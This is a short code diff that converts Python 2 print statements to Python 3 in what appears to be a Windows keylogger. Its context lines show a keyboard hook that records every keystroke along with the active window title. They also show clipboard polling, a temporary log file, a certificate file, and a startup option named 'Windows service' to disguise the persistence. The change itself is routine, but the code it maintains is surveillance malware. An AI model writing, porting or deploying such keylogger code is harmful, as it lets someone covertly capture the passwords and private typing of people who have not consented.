@@ -132,11 +132,11 @@ def on_key_down(event):
     curr_win = GetWindowTextW(win32gui.GetForegroundWindow())
     un_char = ToUnicode(event.KeyID)
     if DEBUG:
-        print "Modifiers", modifiers
-        print "Unicode:", un_char
-        print "Virtual Key:", event.KeyID
-        print "Ascii:", event.Ascii, chr(event.Ascii)
-        print "Description:", event.Key
+        print("Modifiers", modifiers)
+        print("Unicode:", un_char)
+        print("Virtual Key:", event.KeyID)
+        print("Ascii:", event.Ascii, chr(event.Ascii))
+        print("Description:", event.Key)
     if curr_win != last_win:
         text_buffer += header(curr_win)
         last_win = curr_win
@@ -155,7 +155,7 @@ if __name__ == "__main__":
     CLIP_POLL_RATE = 5
     FILE_NAME = NamedTemporaryFile(delete=False).name
     if DEBUG:
-        print FILE_NAME
+        print(FILE_NAME)
     STARTUP = False
     STARTUP_NAME = "Windows service"
     CERT_FILE = "cert.pem"
